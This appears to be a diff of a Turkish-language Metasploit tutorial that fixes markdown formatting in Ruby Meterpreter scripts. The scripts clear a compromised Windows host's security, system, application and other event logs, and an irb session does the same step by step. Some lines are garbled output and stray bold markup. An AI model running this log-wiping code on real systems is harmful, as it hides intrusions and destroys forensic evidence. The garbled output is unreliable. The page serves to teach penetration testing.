@@ -24,19 +24,19 @@ Bazen hedef bilgisayarda yaptığınız işlemlerin log kayıtlarını temizleme
 ```bash
 # Function for clearing all event logs
 def clrevtlgs**()**
-  evtlogs **=** **[**
+  evtlogs = [
     'security',
     'system',
     'application',
     'directory service',
     'dns server',
     'file replication service'
-  **]**
+  ]
   print_status("Clearing Event Logs, this will leave and event 517")
   begin
     evtlogs.each **do** |evl|
       print_status("\tClearing the #{evl} Event Log")
-      log **=** @client.sys.eventlog.open(evl)
+      log = @client.sys.eventlog.open(evl)
       log.clear
       file_local_write(@dest,"Cleared the #{evl} Event Log")
     end
@@ -98,7 +98,7 @@ Ardından meterpreter shell içerisinden Ruby kodlayıcısını `irb` komutuyla 
 meterpreter > irb
 > Starting IRB shell
 > The 'client' variable holds the meterpreter client
-**>>** log **=** client.sys.eventlog.open('system')
+**>>** log = client.sys.eventlog.open('system')
 => #>#:0xb6779424 @client=#>, #>, #
 
 "windows/browser/facebook_extractiptc"=>#, "windows/antivirus/trendmicro_serverprotect_earthagent"=>#, "windows/browser/ie_iscomponentinstalled"=>#, "windows/exec/reverse_ord_tcp"=>#, "windows/http/apache_chunked"=>#, "windows/imap/novell_netmail_append"=>#
@@ -134,18 +134,18 @@ Aşağıdaki kodları bir dosyaya yazarak `/usr/share/metasploit-framework/scrip
 
 
 ```bash
-evtlogs **=** **[**
+evtlogs = [
         'security',
         'system',
         'application',
         'directory service',
         'dns server',
         'file replication service'
-        **]**
+        ]
 print_line("Clearing Event Logs, this will leave an event 517")
 evtlogs.each **do** |evl|
         print_status("Clearing the #{evl} Event Log")
-        log **=** client.sys.eventlog.open(evl)
+        log = client.sys.eventlog.open(evl)
         log.clear
 end
 print_line("All Clear! You are a Ninja!")
